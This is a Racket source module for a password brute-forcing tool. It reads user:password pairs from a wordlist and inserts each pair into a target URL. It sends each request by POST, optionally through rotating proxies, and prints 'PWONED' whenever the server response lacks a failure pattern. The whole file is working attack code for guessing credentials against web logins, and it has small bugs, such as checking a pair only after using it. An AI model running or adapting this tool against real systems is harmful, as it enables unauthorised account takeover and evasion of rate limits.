#lang racket

(require net/url)
(provide force-it-with-port!
         (struct-out config))

(struct config (url
                passwd-file
                pattern-fail
                passwd-first?
                verbose?
                debug?
                proxylist)
  #:mutable
  #:transparent)


;; get-credentials-list : string port -> list or false 
(define (force-it-with-port! opt port)
  (let ([url (config-url opt)]
        [file-location (config-passwd-file opt)]
        [pattern (config-pattern-fail opt)]
        [passwd-first? (config-passwd-first? opt)]
        [verbose? (config-verbose? opt)]
        [debug? (config-debug? opt)]
        [proxylist (config-proxylist opt)])
    
    (let loop ([line (read-line port)])
      (when (not (eof-object? line))
        (let* ([credentials (get-credentials-list line passwd-first?)]
               [first-credential (first credentials)]
               [second-credential (second credentials)])
          (when credentials
            (when verbose?
              (displayln (format "trying ~a with cretendials ~a:~a" url first-credential second-credential)))
            (when (and (list? proxylist) (> (length proxylist) 0))
              (current-proxy-servers proxylist))
            (let* ([post-return
                    (post-pure-port
                     (string->url
                      (format url first-credential second-credential))
                     #"")]
                   [string-return (port->string post-return)])
              (when debug?
                (displayln (format "Server Response:"))
                (displayln string-return))
              (when (not (regexp-match? pattern string-return))
                (displayln (format "PWONED with ~a:~a" first-credential second-credential))))))
        (loop (read-line port)))))
  port)

(define (get-credentials-list line passwd-first?)
  (let ([credentials (regexp-split ":" line)])
    (if passwd-first?
        (if (and (> (length credentials) 1)
                 (> (string-length (second credentials)) 0))
            (list (second credentials) (first credentials))
            #f)
        (list (first credentials) (second credentials)))))



